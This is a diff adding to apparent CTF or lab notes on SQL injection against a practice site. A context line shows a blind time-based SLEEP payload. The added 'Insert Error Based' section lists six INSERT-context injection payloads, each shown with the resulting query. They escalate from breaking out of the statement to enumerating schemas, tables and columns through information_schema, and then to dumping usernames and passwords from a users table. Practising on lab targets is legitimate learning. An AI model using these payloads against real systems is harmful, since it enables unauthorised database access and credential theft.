@@ -73,4 +73,23 @@ Blind Based
 5.https://77kwz3yx.eu1.ctfio.com/?email=' or 1=( select SLEEP(3) from users where username like 'a%' LIMIT 1 );
 # select * from newsletter where email='' or 1=( select SLEEP(3) from users where username like 'a%' LIMIT 1 );'
 
+Insert Error Based
 
+1.title','comment');--
+# insert into comments (date,title,comment) values ('1784557994','title','comment');--','')
+
+2.title',version());--
+# insert into comments (date,title,comment) values ('1784557994','title',version());--','')
+
+3. title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
+# insert into comments (date,title,comment) values ('1784557994','title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--','')
+
+4. title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
+# insert into comments (date,title,comment) values ('1784557994','title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--','')
+
+5. title',(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns where TABLE_SCHEMA='sqli_five' and TABLE_NAME='users'));--
+# insert into comments (date,title,comment) values ('1784557994','title',(SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns where TABLE_SCHEMA='sqli_five' and TABLE_NAME='users'));--','')
+
+6. title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
+# insert into comments (date,title,comment) values ('1784557994','title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'
+') FROM sqli_five.users));--','')
